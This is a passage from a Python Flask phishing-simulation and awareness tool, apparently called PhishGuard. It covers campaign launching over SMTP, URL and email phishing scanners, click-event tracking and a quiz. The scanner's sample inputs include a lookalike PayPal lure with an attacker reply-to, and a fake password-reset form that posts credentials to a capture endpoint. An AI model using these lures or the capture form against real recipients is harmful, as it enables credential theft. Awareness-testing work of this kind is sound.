    body.user=$('smtp-user').value; body.password=$('smtp-pass').value;
    body.tls=$('smtp-tls').checked;
  }
  const res = await fetch(`/api/campaigns/${currentCampaignId}/launch`, {
    method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)
  }).then(r=>r.json());
  closeLaunchModal();
  toast(`🚀 Campaign launched! ${res.sent} emails ${useSmtp?'sent':'simulated'}. ${res.errors?.length||0} errors.`);
  viewCampaign(currentCampaignId);
}

// ── URL Analyzer ───────────────────────────────────────────────────────────
function quickURL(url){ $('url-input').value=url; scanURL(); }

async function scanURL(){
  const url=$('url-input').value.trim();
  if(!url){ toast('Enter a URL first'); return; }
  const res = await fetch('/api/analyze/url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})}).then(r=>r.json());
  showURLResult(res);
  loadURLHistory();
}

function showURLResult(res){
  $('url-result-card').style.display='block';
  $('url-result-url').textContent=res.url.slice(0,50)+(res.url.length>50?'...':'');
  const col=riskColor(res.score);
  $('url-score').textContent=res.score;
  $('url-score').style.color=col;
  $('url-level').textContent=res.level;
  $('url-level').style.color=col;
  // SVG ring
  const circ=314; const offset=circ-(res.score/100*circ);
  const ring=$('url-ring');
  ring.style.stroke=col; ring.style.strokeDashoffset=offset;
  // Indicators
  if(res.indicators.length){
    $('url-indicators').innerHTML=res.indicators.map(i=>`
      <div class="indicator">
        <span class="ind-sev sev-${i.severity.toLowerCase()}">${i.severity}</span>
        <span class="ind-text">${esc(i.label)}</span>
        <span class="ind-pts">+${i.points}</span>
      </div>`).join('');
    $('url-no-indicators').style.display='none';
  } else {
    $('url-indicators').innerHTML='';
    $('url-no-indicators').style.display='block';
  }
}

async function loadURLHistory(){
  const stats = await fetch('/api/stats').then(r=>r.json());
  const hist  = stats.analyze_history.filter(a=>a.input_type==='url');
  $('url-history').innerHTML = hist.map(h=>`
    <tr>
      <td class="mono" style="font-size:.68rem;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--cyan)">${esc(h.input_data)}</td>
      <td class="mono"><span style="color:${riskColor(h.risk_score)}">${h.risk_score}</span></td>
      <td><span class="tag" style="background:${riskBg(h.risk_score)};color:${riskColor(h.risk_score)};border:1px solid ${riskColor(h.risk_score)}40">${h.risk_level}</span></td>
      <td class="mono" style="font-size:.65rem;color:var(--t3)">${h.timestamp.slice(11,19)}</td>
    </tr>`).join('') || '<tr><td colspan="4"><div class="empty"><div class="eico">🔍</div><div class="etxt">No scans yet</div></div></td></tr>';
}

// ── Email Scanner ──────────────────────────────────────────────────────────
const EMAIL_SAMPLES = {
  spf_fail: {
    headers:`From: PayPal Security <security@paypa1.com>\nReply-To: attacker@evil.ru\nReceived-SPF: fail (domain does not designate as permitted sender)\nDKIM-Signature: v=1; a=rsa-sha256; FAIL`,
    body:`<html><body>Dear Customer,<br><br>Your PayPal account has been <strong>suspended</strong> due to suspicious activity. Click <a href="http://paypa1.com/verify?token=abc123">here</a> to verify immediately or your account will be permanently closed within 24 hours.<br><br>Act now to avoid account termination.</body></html>`
  },
  cred_form: {
    headers:`From: IT Help Desk <helpdesk@company-internal.com>`,
    body:`<html><body>Hello valued employee,<br>Your password expires today. Please reset it now.<br><form action="http://192.168.1.100/capture" method="POST"><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Current Password"><input type="submit" value="Reset Now"></form></body></html>`
  }
};

function loadEmailSample(key){
  const s=EMAIL_SAMPLES[key];
  if(!s) return;
  $('email-headers').value=s.headers;
  $('email-body').value=s.body;
}

async function scanEmail(){
  const headers=$('email-headers').value.trim();
  const body=$('email-body').value.trim();
  if(!body){ toast('Paste email body first'); return; }
  const res=await fetch('/api/analyze/email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({headers,body})}).then(r=>r.json());
  $('email-result-card').style.display='block';
  const col=riskColor(res.score);
  $('email-score').textContent=res.score; $('email-score').style.color=col;
  $('email-level').textContent=res.level; $('email-level').style.color=col;
  const ring=$('email-ring');
  ring.style.stroke=col; ring.style.strokeDashoffset=314-(res.score/100*314);
  $('email-verdict').textContent=res.score>=70?'⚠ Likely Phishing Email':res.score>=40?'⚠ Suspicious Email':'✅ Appears Legitimate';
  $('email-verdict').style.color=col;
  $('email-summary').textContent=`Risk Score: ${res.score}/100 · ${res.indicators.length} indicator(s) found`;
  $('email-indicators').innerHTML=res.indicators.map(i=>`
    <div class="indicator">
      <span class="ind-sev sev-${i.severity.toLowerCase()}">${i.severity}</span>
      <span class="ind-text">${esc(i.label)}</span>
      <span class="ind-pts">+${i.points}</span>
    </div>`).join('') || '<div style="color:var(--t3);font-size:.8rem;padding:8px 0">✅ No indicators found</div>';
}

// ── Events page ─────────────────────────────────────────────────────────────
async function loadAllEvents(){
  const stats=await fetch('/api/stats').then(r=>r.json());
  $('ev-count').textContent=stats.recent_events.length+' recent events';
  $('ev-body').innerHTML=stats.recent_events.map(e=>`
    <tr>
      <td class="mono">${e.timestamp.replace('T',' ').slice(0,19)}</td>
      <td><span class="ev-type type-${e.event_type}">${e.event_type}</span></td>
      <td class="mono" style="color:var(--t3)">Cam #${e.campaign_id||'—'}</td>
      <td class="mono" style="color:var(--t3)">Target #${e.target_id||'—'}</td>
      <td class="mono" style="color:var(--cyan)">${e.ip_address||'—'}</td>
      <td style="font-size:.68rem;color:var(--t2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.user_agent||'—')}</td>
    </tr>`).join('') || '<tr><td colspan="6"><div class="empty"><div class="eico">⚡</div><div class="etxt">No events yet</div></div></td></tr>';
}

// ── Awareness Quiz ─────────────────────────────────────────────────────────
const QUIZ = [
  {q:'You receive an urgent email from your "bank" asking you to click a link and verify your password. What do you do?', a:'Go directly to your bank\'s website by typing the URL — never click email links for sensitive logins.', phishing:true},
  {q:'An email has a padlock icon (HTTPS) on its link. Is it safe to enter your password?', a:'No! HTTPS only means the connection is encrypted, not that the site is legitimate. Phishing sites use HTTPS too.', phishing:true},
  {q:'Your IT department emails you: "Reset your password at help.company.com/reset". The URL matches your company domain exactly. Is this suspicious?', a:'Less suspicious if the domain is correct, but always verify by calling IT directly before clicking.', phishing:false},
  {q:'You receive a DocuSign email but the reply-to address is different from the sender. Red flag?', a:'Yes! A mismatch between sender and reply-to is a classic phishing indicator.', phishing:true},
  {q:'An email uses your full name and job title. Does that mean it\'s legitimate?', a:'No — spear phishing uses personal details harvested from LinkedIn, social media, or data breaches.', phishing:true},
];
let quizIdx=0;
function nextQuiz(){
  const q=QUIZ[quizIdx%QUIZ.length]; quizIdx++;
  $('quiz-container').innerHTML=`
    <div style="background:var(--s3);border-radius:7px;padding:14px;margin-bottom:10px">
      <div style="font-size:.82rem;font-weight:500;margin-bottom:10px">${esc(q.q)}</div>
      <div style="font-size:.75rem;color:${q.phishing?'var(--red)':'var(--green)'};background:${q.phishing?'rgba(239,68,68,.08)':'rgba(34,197,94,.08)'};border:1px solid ${q.phishing?'rgba(239,68,68,.2)':'rgba(34,197,94,.2)'};border-radius:5px;padding:10px">
        <strong>${q.phishing?'⚠ This is likely a phishing attempt!':'✅ This looks legitimate.'}</strong><br><span style="color:var(--t2)">${esc(q.a)}</span>
      </div>
    </div>`;
}

// ── Override preview route to support ?tmpl query ──────────────────────────
// (handled server-side below, just ensure reload)

// ── Init ────────────────────────────────────────────────────────────────────
nextQuiz();
refreshDashboard();
setInterval(refreshDashboard, 5000);
</script>
</body>
</html>"""

@app.route("/")
def dashboard():
    return DASHBOARD

# Override preview to support template query param
@app.route("/api/campaigns/<int:cid>/preview")
def api_preview_ex(cid):
    tmpl_id = request.args.get("tmpl")
    conn = get_db()
    if cid == 0 and tmpl_id:
        template = TEMPLATES.get(tmpl_id, {})
    else:
        c = conn.execute("SELECT * FROM campaigns WHERE id=?", (cid,)).fetchone()
        if not c:
            conn.close()
            return "Not found", 404
        template = TEMPLATES.get(c["template_id"], {})
    conn.close()
    html = template.get("html","<p>No template</p>").format(
        first_name="Jane", email="jane.doe@company.com",
        department="Engineering", track_url="#",
        token="PREVIEW0", timestamp=datetime.now().strftime("%b %d, %Y %H:%M UTC"),
    )
    return html

# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    init_db()
    print("""
╔════════════════════════════════════════════════════════╗
║         PhishGuard — Phishing Simulation Platform      ║
╠════════════════════════════════════════════════════════╣
║  Dashboard  : http://localhost:7000                    ║
║  Database   : phishguard.db                            ║
║  Logs       : phishguard.log                           ║
╠════════════════════════════════════════════════════════╣
║  ⚠  AUTHORIZED SECURITY AWARENESS TESTING ONLY        ║
╚════════════════════════════════════════════════════════╝
""")
    app.run(host="0.0.0.0", port=WEB_PORT, debug=False, use_reloader=False)
